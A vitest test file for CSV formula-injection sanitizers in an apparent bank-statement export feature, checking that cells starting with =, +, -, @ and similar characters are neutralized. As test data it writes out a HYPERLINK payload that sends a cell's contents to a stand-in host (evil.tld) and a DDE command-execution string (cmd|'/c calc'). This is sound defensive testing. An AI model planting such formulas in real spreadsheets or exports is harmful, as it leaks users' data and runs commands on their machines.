/**
 * Bug-hunt finding SEC1: CSV formula injection. Exports escaped quotes only,
 * but spreadsheets strip CSV quoting BEFORE evaluating a cell — and these
 * strings come from the bank or merchant that produced an imported statement,
 * not from the person exporting the file.
 */
import { describe, expect, it } from 'vitest';
import { csvSafeValue, csvSafeQuoted } from '@/lib/utils/csv-safe';

describe('csvSafeValue (SEC1)', () => {
  it.each(['=', '+', '-', '@', '\t', '\r'])('neutralizes a leading %j', (trigger) => {
    expect(csvSafeValue(`${trigger}HYPERLINK("http://evil")`)).toBe(
      `'${trigger}HYPERLINK("http://evil")`
    );
  });

  it('neutralizes the classic exfiltration payload', () => {
    const payload = '=HYPERLINK("https://evil.tld/x?d="&A2,"Refund details")';
    expect(csvSafeValue(payload).startsWith("'=")).toBe(true);
  });

  it('leaves ordinary merchant descriptors untouched', () => {
    for (const value of ['GROCERY OUTLET', 'AMAZON.COM*A1B2', '5709 GRAHAM FOOD MART']) {
      expect(csvSafeValue(value)).toBe(value);
    }
  });

  it('does not mangle a trigger character that is not leading', () => {
    expect(csvSafeValue('A=B')).toBe('A=B');
  });

  it('handles null, undefined and empty values', () => {
    expect(csvSafeValue(null)).toBe('');
    expect(csvSafeValue(undefined)).toBe('');
    expect(csvSafeValue('')).toBe('');
  });
});

describe('csvSafeQuoted', () => {
  it('quotes and escapes as well as neutralizing', () => {
    expect(csvSafeQuoted('=cmd|\'/c calc\'!A0')).toBe('"\'=cmd|\'/c calc\'!A0"');
    expect(csvSafeQuoted('BOB"S DINER')).toBe('"BOB""S DINER"');
    expect(csvSafeQuoted('AMAZON, INC')).toBe('"AMAZON, INC"');
  });
});
